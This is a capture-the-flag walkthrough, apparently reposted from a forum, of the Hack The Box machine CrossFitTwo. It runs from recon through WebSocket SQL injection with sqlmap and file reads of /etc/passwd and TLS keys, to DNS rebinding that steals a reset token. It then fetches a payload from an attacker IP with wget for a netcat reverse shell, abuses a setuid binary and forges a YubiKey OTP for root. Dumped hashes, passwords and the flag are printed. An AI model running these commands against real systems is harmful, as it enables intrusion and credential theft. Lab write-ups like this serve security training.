# CrossFitTwo

Rank : Insane 
OS :  Linux 
IP : 10.10.10.232

## Recon 

```bash
nmap -Pn -sV -p- -v 10.10.10.232
```


Let visits the web site. 
![[Pasted image 20210523171702.png]]

sub domain found:
*http://employees.crossfit.htb/*
Add it to the hosts file.  
Lets do enumeration on the site. 

```bash
dirsearch -u [http://10.10.10.232](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232) \-e \* dirsearch -u [http://employees.crossfit.htb](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Femployees.crossfit.htb) \-e \*
```




\================= \[ WRITEUP \] =====================  
  
1) -- Portscan --  
  
  
  
\# Nmap 7.91 scan initiated Thu Mar 25 14:03:07 2021 as: nmap -Pn -sV -A -p- --min-rate=10000 -oN Crossfit2.nmap 10.10.10.232  
  
Warning: 10.10.10.232 giving up on port because retransmission cap hit (10).  
  
Nmap scan report for 10.10.10.232  
  
Host is up (0.046s latency).  
  
Not shown: 61643 filtered ports, 3890 closed ports  
  
PORT  STATE SERVICE    VERSION  
  
22/tcp open  tcpwrapped  
  
| ssh-hostkey:  
  
|  3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)  
  
|  256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)  
  
|\_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)  
  
80/tcp open  tcpwrapped  
  
|\_http-server-header: OpenBSD httpd  
  
|\_http-title: CrossFit  
  
PORT    STATE SERVICE            VERSION  
  
8953/tcp open  ssl/ub-dns-control?  
  
  
  
\--------------------------------------------------------------------------------------------  
  
  
  
  
  
2) -- Directory Enum --  
  
  
  
dirsearch -u [http://10.10.10.232](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232) \-e \* dirsearch -u [http://employees.crossfit.htb](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Femployees.crossfit.htb) \-e \*  
  
  
  
\-- Result: http 200 --  
  
  
  
[http://10.10.10.232/css/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Fcss%2F)  
  
[http://10.10.10.232/fonts/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Ffonts%2F)  
  
[http://10.10.10.232/img/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Fimg%2F)  
  
[http://10.10.10.232/images/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Fimages%2F)  
  
[http://10.10.10.232/index.php](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Findex.php)  
  
[http://10.10.10.232/index.php/login/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Findex.php%2Flogin%2F)  
  
[http://10.10.10.232/js/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Fjs%2F)  
  
[http://10.10.10.232/readme.txt](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Freadme.txt)  
  
[http://employees.crossfit.htb/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Femployees.crossfit.htb%2F)  
  
[http://employees.crossfit.htb/package-lock.json](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Femployees.crossfit.htb%2Fpackage-lock.json)  
  
[http://employees.crossfit.htb/js/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Femployees.crossfit.htb%2Fjs%2F)  
  
/index.php  
  
/index.php/login/  
  
[http://employees.crossfit.htb/css/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Femployees.crossfit.htb%2Fcss%2F)  
  
[http://employees.crossfit.htb/password-reset.php](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Femployees.crossfit.htb%2Fpassword-reset.php)  
  
[http://employees.crossfit.htb/password-reset.php?token](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Femployees.crossfit.htb%2Fpassword-reset.php%3Ftoken)\=  
  
[http://gym.crossfit.htb](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Fgym.crossfit.htb)  
  
  
  
/images              (Status: 301) \[Size: 510\] \[--> [http://10.10.10.232/images/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Fimages%2F)\]  
  
/js                  (Status: 301) \[Size: 510\] \[--> [http://10.10.10.232/js/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Fjs%2F)\]  
  
/css                  (Status: 301) \[Size: 510\] \[--> [http://10.10.10.232/css/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Fcss%2F)\]  
  
/img                  (Status: 301) \[Size: 510\] \[--> [http://10.10.10.232/img/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Fimg%2F)\]  
  
/blog.php            (Status: 200) \[Size: 15369\]  
  
/contact.php          (Status: 200) \[Size: 8007\]  
  
/classes.php          (Status: 200) \[Size: 25946\]  
  
/index.php            (Status: 200) \[Size: 19041\]  
  
/fonts                (Status: 301) \[Size: 510\] \[--> [http://10.10.10.232/fonts/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Ffonts%2F)\]  
  
/about-us.php        (Status: 200) \[Size: 15733\]  
  
/elements.php        (Status: 200) \[Size: 19654\]  
  
/vendor              (Status: 301) \[Size: 510\] \[--> [http://10.10.10.232/vendor/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Fvendor%2F)\]  
  
/lgn                  (Status: 301) \[Size: 510\] \[--> [http://10.10.10.232/lgn/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F10.10.10.232%2Flgn%2F)\]  
  
/index.php            (Status: 200) \[Size: 19041\]  
  
\---------------------------------------------------------------------------------  
  
  
  
modify etc/hosts --->  
  
  
  
10.10.10.232 crossfit.htb employees.crossfit.htb gym.crossfit.htb  
  
  
  
  
  
  
  
3) -- Test Websockets --  
  
  
  
python3 -m websockets ws://gym.crossfit.htb/ws/  
  
  
  
{"status":"200","message":"Hello! This is Arnold, your assistant. Type 'help' to see available commands.","token":"66c7fa72f1cab3e94d71139f8f21d8fe0ecd8b70ab0cace356cd7bdb2cfbd1bf"}  
  
  
  
Available commands:  
  
\- coaches  
  
\- classes  
  
\- memberships ---> vulnerable parameter "params"  
  
  
  
\---------------------------------------------------------------------------------##  
  
  
  
  
  
4) -- Exploit sqli --  
  
  
  
WORKED!! ##  
  
  
  
\- Run script exploit.py:  
  
  
  
python3 exploit.py  
  
  
  
└─# python3 exploit.py  
  
\* Serving Flask app "exploit" (lazy loading)  
  
\* Environment: production  
  
 WARNING: This is a development server. Do not use it in a production deployment.  
  
 Use a production WSGI server instead.  
  
\* Debug mode: off  
  
\* Running on [http://127.0.0.1:5000/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F) (Press CTRL+C to quit)  
  
\------------------------------------------------------------------------------------  
  
  
  
  
  
\-- Vulnerable parameter at sqli: "params" --  
  
  
  
\-- Run sqlmap on localhost:5000 which will proxyes to the WebSocket ws://gym.crossfit.htb/ws/ --  
  
  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --dbs --level 5 --risk 3  
  
  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "employees" -T employees -C username --dump  
  
  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "employees" -T employees -C password --dump  
  
  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "employees" -T employees -C email --dump  
  
  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "employees" -T employees -C email,token --dump --fresh-queries --threads 10  
  
  
  
\------------------------------------------------------------------  
  
  
  
\-- Results of the dump of the columns of the Employes db --  
  
  
  
Database: employees   
  
Table: employees  
  
\[4 entries\]  
  
+---------------+  
  
| username      |  
  
+---------------+  
  
| administrator |  
  
| jparker      |  
  
| mwilliams    |  
  
| wsmith        |  
  
+---------------+  
  
  
  
Database: employees  
  
Table: employees  
  
\[4 entries\]  
  
+------------------------------------------------------------------+  
  
| password                                                        |  
  
+------------------------------------------------------------------+  
  
| 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 |  
  
| 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 |  
  
| fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c |  
  
| fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 |  
  
+------------------------------------------------------------------+  
  
  
  
Database: employees   
  
Table: employees  
  
\[4 entries\]  
  
+-----------------------------+  
  
| email                      |  
  
+-----------------------------+  
  
| david.palmer@crossfit.htb |  
  
| jack.parker@crossfit.htb |  
  
| maria.williams@crossfit.htb |  
  
| will.smith@crossfit.htb |  
  
+-----------------------------+  
  
  
  
  
  
5) -- Data Exfiltration with function of sqlmap--  
  
  
  
The data exfiltrated with sqlmap can be found here ----> /root/.local/share/sqlmap/output/127.0.0.1/files  
  
  
  
  
  
\-- First let's run this script --  
  
  
  
python3 exploit.py ----> which will proxyes to the WebSocket ws://gym.crossfit.htb/ws/  
  
  
  
  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "crossfit" -T "membership\_plans" -C "password" --file-read /etc/httpd.conf  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "crossfit" -T "membership\_plans" -C "password" --file-read /etc/passwd  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "crossfit" -T "membership\_plans" -C "password" --file-read /var/unbound/etc/unbound.conf  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "crossfit" -T "membership\_plans" -C "password" --file-read /var/unbound/etc/tls/unbound\_server.key  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "crossfit" -T "membership\_plans" -C "password" --file-read /var/unbound/etc/tls/unbound\_control.pem  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "crossfit" -T "membership\_plans" -C "password" --file-read /var/unbound/etc/tls/unbound\_control.key  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "crossfit" -T "membership\_plans" -C "password" --file-read /var/unbound/etc/tls/unbound\_server.pem  
  
sqlmap -u [http://127.0.0.1:5000/?id=1](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2F127.0.0.1%3A5000%2F%3Fid%3D1) --level 5 --risk 3 -D "crossfit" -T "membership\_plans" -C "password" --file-read /etc/relayd.conf  
  
  
  
  
  
  
  
6) -- Part Configuration Unbound --  
  
  
  
Put all certificates on path -----> /etc/unbound on your machine  
  
  
  
  
  
In the unbound.conf file comment all the server part and change with the current path of the certificates exfiltrated from the box  
  
  
  
the file unbound.conf it must look like this:  
  
  
  
\-------------------------------------------------------------  
  
remote-control:  
  
 control-enable: yes  
  
 control-interface: 0.0.0.0  
  
 control-use-cert: yes  
  
 server-key-file: "/etc/unbound/unbound\_server.key"  
  
 server-cert-file: "/etc/unbound/unbound\_server.pem"  
  
 control-key-file: "/etc/unbound/unbound\_control.key"  
  
 control-cert-file: "/etc/unbound/unbound\_control.pem"  
  
 server-key-file: "/etc/unbound/unbound\_server.key"  
  
\--------------------------------------------------------------  
  
  
  
  
  
Run this control command:  
  
  
  
unbound-control -c path where put unbound.conf before exfiltrated /my\_unbound.conf -s 10.10.10.232@8953 status  
  
  
  
version: 1.11.0  
  
verbosity: 1  
  
threads: 1  
  
modules: 2 \[ validator iterator \]  
  
uptime: 46 seconds  
  
options: control(ssl)  
  
unbound (pid 9554) is running...  
  
  
  
  
  
\------------------------------------------------------------------------------------------------  
  
  
  
  
  
  
  
7) -- Part DNS Rebinding --  
  
  
  
\## there is a misconfig in the conf file as there is a wildcard before the domain name and we can use this to our advantage ##  
  
  
  
\-- Exploit Misconfig on relayd.conf  
  
  
  
 pass request quick header "Host" value "\*crossfit-club.htb" forward to <3>  
  
 pass request quick header "Host" value "\*employees.crossfit.htb" forward to <2>  
  
  
  
  
  
Found New Domain:  
  
  
  
## [http://crossfit-club.htb](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Fcrossfit-club.htb) ##  
  
  
  
xemployees.crossfit.htb ----> domain to add to the file /etc/hosts  
  
  
  
Forward dns traffic via this command:  
  
  
  
unbound-control -c my\_unbound.conf -s 10.10.10.232@8953 forward\_add +i fuckemployees.crossfit.htb. <your\_ip>@53  
  
  
  
Utilizzare un fake dns con questo comando:  
  
  
  
i=0; dnschef -i <your\_ip --fakedomains xemployees.crossfit.htb --fakeip 127.0.0.1 2>&1 | while read line; do case "$line" in \*cooking\*) (( i++ )); echo $i;  \[\[ "$i" -gt 1 \]\]  && pkill -f dnschef;; esac; done; dnschef -i <your\_ip --fakedomains xemployees.crossfit.htb --fakeip <your\_ip  
  
  
  
Listen on netcat:  
  
nc -nlvp 80  
  
  
  
Token receveid:  
  
connect to \[<your\_ip\] from (UNKNOWN) \[10.10.10.232\] 39907  
  
GET /password-reset.php?token=9bb1cc830641bde976969ef85edc3f78b108c344bdbc0355b30749d5895803691a2f50a2534258fbb471f05fe4124bfda4d92bb1dd833a3aa8db4e9250055fc1 HTTP/1.1  
  
Host: fuckemployees.crossfit.htb  
  
User-Agent: Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0  
  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8  
  
Accept-Language: en-US,en;q=0.5  
  
Accept-Encoding: gzip, deflate  
  
Connection: keep-alive  
  
Referer: [http://crossfit-club.htb/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Fcrossfit-club.htb%2F)  
  
Upgrade-Insecure-Requests: 1  
  
  
  
\----------------------------------------------------------------  
  
  
  
\-- Enumeration crossfit-club.htb --  
  
  
  
\---- Scanning URL: [http://crossfit-club.htb/](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Fcrossfit-club.htb%2F) \----  
  
+ [http://crossfit-club.htb/chat](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Fcrossfit-club.htb%2Fchat) (CODE:200|SIZE:4069)   
  
+ [http://crossfit-club.htb/favicon.ico](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Fcrossfit-club.htb%2Ffavicon.ico) (CODE:200|SIZE:58784)   
  
+ [http://crossfit-club.htb/home](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Fcrossfit-club.htb%2Fhome) (CODE:200|SIZE:4069)   
  
+ [http://crossfit-club.htb/index.html](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Fcrossfit-club.htb%2Findex.html) (CODE:200|SIZE:4069)   
  
+ [http://crossfit-club.htb/login](https://raidforums.com/misc.php?action=safelinks&url=http%3A%2F%2Fcrossfit-club.htb%2Flogin) (CODE:200|SIZE:4069)  
  
  
  
  
  
  
  
8) --- David User Part --  
  
  
  
start Apache2:  
  
  
  
service apache2 start  
  
  
  
Install:  
  
apt-get install uuid-runtime  
  
  
  
\-- And run script ./message.sh  
  
  
  
Then after 2 minutes:  
  
  
  
cat /var/log/apache2/access.log| grep -i david  
  
  
  
SSH creds:  
  
david:NWBFcSe3ws4VDhTB  
  
  
  
cat access.log --->  
  
  
  
  
  
10.10.10.232 - - \[01/Apr/2021:14:13:06 -0400\] "GET /RECV?data={%22sender\_id%22:2,%22content%22:%22Hello%20David,%20I%27ve%20added%20a%20user%20account%20for%20you%20with%20the%20password%20NWBFcSe3ws4VDhTB.%22,%22roomId%22:2,%22\_id%22:3075} HTTP/1.1" 404 490 "http://employees-crossfit.htb/a2ba575503da.html" "Mozilla/5.0 (X11; OpenBSD amd64; rv:82.0) Gecko/20100101 Firefox/82.0"  
  
  
  
  
  
ssh david@10.10.10.232  
  
  
  
and then type sh to get a more usable shell  
  
  
  
  
  
  
  
  
  
9) -- Privesc for user John --  
  
  
  
script app.js to be replaced with the original one that will be recalled by the user john --->  
  
  
  
  
  
Formatted script for unix  
  
  
  
dos2unix app.js  
  
  
  
\- And then we execute these commands, quickly because there is autoclean:  
  
  
  
cd /opt/sysadmin  
  
mkdir node\_modules  
  
cd node\_modules  
  
cp -r /usr/local/lib/node\_modules/log-to-file .  
  
cd log-to-file  
  
rm app.js  
  
wget <Your\_IP>/app.js  
  
  
  
or used my script john.sh--  
  
  
  
wget <Your\_IP>/john.sh  
  
chmod +x john.sh  
  
./john.sh  
  
  
  
nc -nlvp 4444  
  
  
  
\--- And we have the shell with john!!!!  
  
  
  
  
  
10) -- Privesc Root Part --  
  
  
  
  
  
\--Enum  
  
  
  
find / -type f -perm -4000 -ls 2>/dev/null  
  
1425624  52 -r-sr-xr-x    3 root    bin        26552 Oct  5 00:47 /usr/bin/chfn  
  
1425624  52 -r-sr-xr-x    3 root    bin        26552 Oct  5 00:47 /usr/bin/chpass  
  
1425624  52 -r-sr-xr-x    3 root    bin        26552 Oct  5 00:47 /usr/bin/chsh  
  
1425650  56 -r-sr-xr-x    1 root    bin        27464 Oct  5 00:47 /usr/bin/doas  
  
1425715  60 -r-sr-sr-x    1 root    daemon      29936 Oct  5 00:47 /usr/bin/lpr  
  
1425716  52 -r-sr-sr-x    1 root    daemon      24880 Oct  5 00:47 /usr/bin/lprm  
  
1425743  44 -r-sr-xr-x    1 root    bin        20936 Oct  5 00:47 /usr/bin/passwd  
  
1425809  36 -r-sr-xr-x    1 root    bin        17216 Oct  5 00:47 /usr/bin/su  
  
1478072  20 -r-sr-xr-x    1 root    bin          8880 Oct  5 00:47 /usr/libexec/lockspool  
  
1478095  960 -r-sr-xr-x    1 root    bin        466608 Oct  5 00:47 /usr/libexec/ssh-keysign  
  
1481580  20 -rwsr-s---    1 root    staff        9024 Jan  5 13:04 /usr/local/bin/log  
  
1503426  48 -r-sr-sr-x    2 root    authpf      23000 Oct  5 00:47 /usr/sbin/authpf  
  
1503426  48 -r-sr-sr-x    2 root    authpf      23000 Oct  5 00:47 /usr/sbin/authpf-noip  
  
1503506  288 -r-sr-x---    1 root    network    146208 Oct  5 00:47 /usr/sbin/pppd  
  
1503559  64 -r-sr-xr-x    2 root    bin        32712 Oct  5 00:47 /usr/sbin/traceroute  
  
1503559  64 -r-sr-xr-x    2 root    bin        32712 Oct  5 00:47 /usr/sbin/traceroute6  
  
362927  736 -r-sr-xr-x    2 root    bin        356768 Oct  5 00:47 /sbin/ping  
  
362927  736 -r-sr-xr-x    2 root    bin        356768 Oct  5 00:47 /sbin/ping6  
  
362934  576 -r-sr-x---    1 root    operator  275928 Oct  5 00:47 /sbin/shutdown  
  
  
  
setuid:  
  
1481580  20 -rwsr-s---    1 root    staff        9024 Jan  5 13:04 /usr/local/bin/log  
  
  
  
  
  
  
  
11) -- exploit /usr/local/bin/log for read file not permitted with John --  
  
  
  
  
  
Found root keys and root id\_rsa ---> save in the files, we will need them later to get a rooted ssh shell:  
  
  
  
/usr/local/bin/log /var/db/yubikey/root.key  
  
6bf9a26475388ce998988b67eaa2ea87 ----> root.key  
  
  
  
/usr/local/bin/log /var/db/yubikey/root.uid  
  
a4ce1128bde4 ----> root.uid  
  
  
  
  
  
/usr/local/bin/log /var/db/yubikey/root.ctr  
  
985089 ----> root.ctr  
  
  
  
/usr/local/bin/log /var/backups/root\_.ssh\_id\_rsa.current  
  
  
  
chmod 600 id\_rsa  
  
  
  
  
  
\-- Download software -------> [https://developers.yubico.com/yubico-c/](https://raidforums.com/misc.php?action=safelinks&url=https%3A%2F%2Fdevelopers.yubico.com%2Fyubico-c%2F)  
  
  
  
extract tar.gz file and...  
  
  
  
sudo apt-get install libtools  
  
sudo apt-get install dh-autoreconf  
  
sudo autoreconf --install  
  
sudo apt-get install asciidoc-base  
  
./configure  
  
make check  
  
sudo make install  
  
  
  
12) --- Generate Yubikey password and root shell---  
  
  
./ykgenerate cat root.key  cat root.uid  $(printf "%06x" $(expr $(cat root.ctr) + 1) | sed 's/..$//g') c0a8 00 $(printf "%06x" $(expr $(cat root.ctr) + 1) | sed 's/^....//g')


./ykgenerate 6bf9a26475388ce998988b67eaa2ea87  a4ce1128bde4  $(printf "%06x" $(expr 985091 + 1) | sed 's/..$//g') c0a8 00 $(printf "%06x" $(expr 985090+ 1) | sed 's/^....//g')
└──╼ #./ykgenerate 6bf9a26475388ce998988b67eaa2ea87  a4ce1128bde4  $(printf "%06x" $(expr $(cat root.ctr) + 1) | sed 's/..$//g') c0a8 00 $(printf "%06x" $(expr $(cat root.ctr) + 1) | sed 's/^....//g')  
kbkjdcjvntkncgindgifcdnclejfukkc  
└──╼ #ssh -i id\_rsa root@10.10.10.232  
root@10.10.10.232's password:    
OpenBSD 6.8 (GENERIC.MP) #4: Mon Jan 11 10:35:56 MST 2021  
  
Welcome to OpenBSD: The proactively secure Unix-like operating system.  
  
Please use the sendbug(1) utility to report bugs in the system.  
Before reporting a bug, please try to reproduce it with the latest  
version of the code.  With bug reports, please try to ensure that  
enough information to reproduce the problem is enclosed, and if a  
known fix for it exists, include that as well.  
  
crossfit2# id                                                                                                                                                                                                                                                              
uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)  
crossfit2# ls  
.Xdefaults      .cache          .config         .cshrc          .cvsrc          .login          .mysql\_history  .npm            .pm2            .profile        .sqlite\_history .ssh            root.txt  
crossfit2# cat root.txt  
6fbc09c17cca32cc7c7b563d5376dd3a  
crossfit2#
